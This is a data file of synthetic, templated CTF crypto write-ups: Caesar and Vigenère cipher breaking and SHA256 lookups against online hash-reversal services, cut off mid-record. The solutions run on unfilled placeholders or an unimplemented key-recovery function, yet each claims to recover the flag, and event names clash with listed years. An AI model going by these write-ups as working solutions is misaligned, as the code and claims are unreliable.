{"id": "synthetic_classical_086", "team": "synthetic_team_9", "event": "CTF_2024_Event_15", "challenge_name": "Caesar Cipher #87", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/86", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833112", "synthetic": true}
{"id": "synthetic_classical_087", "team": "synthetic_team_2", "event": "CTF_2024_Event_19", "challenge_name": "Caesar Cipher #88", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/87", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833122", "synthetic": true}
{"id": "synthetic_classical_088", "team": "synthetic_team_2", "event": "CTF_2024_Event_6", "challenge_name": "Vigenère Cipher #89", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/88", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833312", "synthetic": true}
{"id": "synthetic_classical_089", "team": "synthetic_team_10", "event": "CTF_2024_Event_14", "challenge_name": "Vigenère Cipher #90", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/89", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833335", "synthetic": true}
{"id": "synthetic_classical_090", "team": "synthetic_team_7", "event": "CTF_2024_Event_9", "challenge_name": "Caesar Cipher #91", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/90", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833347", "synthetic": true}
{"id": "synthetic_classical_091", "team": "synthetic_team_10", "event": "CTF_2024_Event_17", "challenge_name": "Caesar Cipher #92", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/91", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833358", "synthetic": true}
{"id": "synthetic_classical_092", "team": "synthetic_team_3", "event": "CTF_2024_Event_17", "challenge_name": "Caesar Cipher #93", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/92", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833369", "synthetic": true}
{"id": "synthetic_classical_093", "team": "synthetic_team_9", "event": "CTF_2024_Event_10", "challenge_name": "Caesar Cipher #94", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/93", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833379", "synthetic": true}
{"id": "synthetic_classical_094", "team": "synthetic_team_1", "event": "CTF_2024_Event_1", "challenge_name": "Caesar Cipher #95", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/94", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833389", "synthetic": true}
{"id": "synthetic_classical_095", "team": "synthetic_team_3", "event": "CTF_2024_Event_18", "challenge_name": "Vigenère Cipher #96", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/95", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833405", "synthetic": true}
{"id": "synthetic_hash_000", "team": "synthetic_team_3", "event": "CTF_2024_Event_19", "challenge_name": "SHA256 Rainbow Table #1", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/0", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833503", "synthetic": true}
{"id": "synthetic_hash_001", "team": "synthetic_team_8", "event": "CTF_2024_Event_9", "challenge_name": "SHA256 Rainbow Table #2", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/1", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833523", "synthetic": true}
{"id": "synthetic_hash_002", "team": "synthetic_team_4", "event": "CTF_2024_Event_6", "challenge_name": "SHA256 Rainbow Table #3", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/2", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833540", "synthetic": true}
{"id": "synthetic_hash_003", "team": "synthetic_team_9", "event": "CTF_2024_Event_19", "challenge_name": "SHA256 Rainbow Table #4", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/3", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833554", "synthetic": true}
{"id": "synthetic_hash_004", "team": "synthetic_team_4", "event": "CTF_2024_Event_5", "challenge_name": "SHA256 Rainbow Table #5", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/4", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833568", "synthetic": true}
{"id": "synthetic_hash_005", "team": "synthetic_team_6", "event": "CTF_2024_Event_16", "challenge_name": "SHA256 Rainbow Table #6", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        